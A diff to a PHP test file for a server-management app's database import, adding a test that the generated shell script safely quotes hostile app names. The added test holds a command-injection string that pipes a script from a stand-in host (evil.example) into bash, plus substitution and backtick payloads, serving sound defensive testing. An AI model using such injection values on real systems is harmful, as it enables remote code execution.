@@ -62,7 +62,7 @@ test('a member assigned to the server can import a sql dump into the app databas
     expect($import->payload['timeout'])->toBe(3600);
     expect($import->payload['command'])->toContain('curl -fsSL --retry 3 -o');
     expect($import->payload['command'])->toMatch('#https?://.*/dumps/[0-9a-f-]{36}\.sql\?expires=#');
-    expect($import->payload['command'])->toContain("mysql -u 'shop_user' -p's3cret!' -h localhost 'shop_db' <");
+    expect($import->payload['command'])->toContain("MYSQL_PWD='s3cret!' mysql -u 'shop_user' -h localhost 'shop_db' <");
     expect($import->payload['command'])->toContain('rm -f');
 
     expect(AuditLog::where('action', 'database.imported')->where('server_id', $app->server_id)->exists())->toBeTrue();
@@ -116,6 +116,28 @@ test('only sql text dumps are accepted', function () {
 
     importDump($app, 'dump.png', 'binary')->assertSessionHasErrors('dump');
     importDump($app, 'dump.sql.gz', 'gz')->assertSessionHasErrors('dump');
+});
+
+test('the import script is shell-safe against hostile app names and urls', function () {
+    Storage::fake();
+    mockGatewayPublishImport();
+    $hostile = 'shop" && curl evil.example/x.sh | bash # $(touch /tmp/pwned) `id`';
+    $app = appWithDatabase();
+    $app->update(['name' => $hostile]);
+
+    $this->actingAs(User::factory()->admin()->create());
+    importDump($app)->assertRedirect();
+
+    $command = $app->server->agentJobs()
+        ->where('type', 'shell')->where('label', 'Import database')
+        ->first()->payload['command'];
+
+    // The app name arrives as one inert single-quoted token (escapeshellarg
+    // form) — verified locally by executing rendered scripts with hostile
+    // names under sh: no breakout, substitution, or backtick runs.
+    expect($command)->toContain('echo ==> Import database for '.escapeshellarg($hostile)."\n");
+    // The signed URL (with its & separator) stays a single quoted argument.
+    expect($command)->toMatch("#curl -fsSL --retry 3 -o '[^']+' 'https?://#");
 });
 
 test('the dump download endpoint serves files only through valid signed urls', function () {
